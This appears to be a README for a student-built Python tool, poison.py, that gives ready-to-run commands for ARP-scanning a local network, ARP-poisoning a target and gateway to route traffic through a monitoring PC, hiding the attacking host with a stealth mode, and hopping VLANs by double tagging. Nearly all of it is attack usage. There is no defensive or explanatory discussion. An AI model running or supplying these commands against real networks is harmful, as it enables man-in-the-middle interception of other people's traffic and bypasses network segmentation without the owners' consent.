# Rat Poison

## Team Members
Patrick Kang Wei Sheng <br/>
Jerome Tan Kian Wei <br/>
Kevin Tan<br/><br/>


### Usage
####Help Menu 
```
python poison.py -h                 
```

####Shows all active host within the local network using ARP Broadcast
```
python poison.py -l 192.168.1.0/24  
```

####Prevents host machine from being discovered 
```
python poison.py --stealth
```


###Options Arguments
ARP poisoning mode without VLAN double tagging<br>
**\*To be used with -T, -M, -G**
```
python poison.py -P                                   
```
ARP poisoning mode with VLAN double tagging<br>
**\*To be used with -T, -M, -G, -TM, -MM, -GM --vlan1 --vlan2**
```
python poison.py -PV
```

####Arguments Usage
Specify target’s IP address
```
-T 192.168.10.10
```

Specify monitoring PC IP address
```
-M 192.168.10.11
```

Specify gateway/target2 IP address
```
-G 192.168.10.1
```

To specify target’s MAC address
```
-TM “AA:AA:AA:AA:AA:AA”
```

Specify monitoring PC MAC address
```
-MM “BB:BB:BB:BB:BB:BB”
```

Specify gateway/target2 MAC address
```
-GM “CC:CC:CC:CC:CC:CC”
```

To specify the first Dot1Q VLAN number
```
--vlan1 10
```

To specify second Dot1Q VLAN number
```
--vlan2 20
```


###Attacks Usages
####Nommal ARP Poisoning 
```
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

####Nommal ARP Poisoning with stealth 
```
python poison.py --stealth -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1
```

####VLAN Hopping with ARP Poisoning (Native VLAN 10, Target VLAN 20)
\* Requires Target MAC, Monitor MAC,Gateway MAC with vlan1 and vlan2

```
python poison.py -P -T 192.168.1.10 -M 192.168.1.148 -G 192.168.1.1 -TM "AA:AA:AA:AA:AA:AA" -MM "BB:BB:BB:BB:BB:BB" -GM "CC:CC:CC:CC:CC:CC" --vlan1 10 --vlan2 20
```


                                                 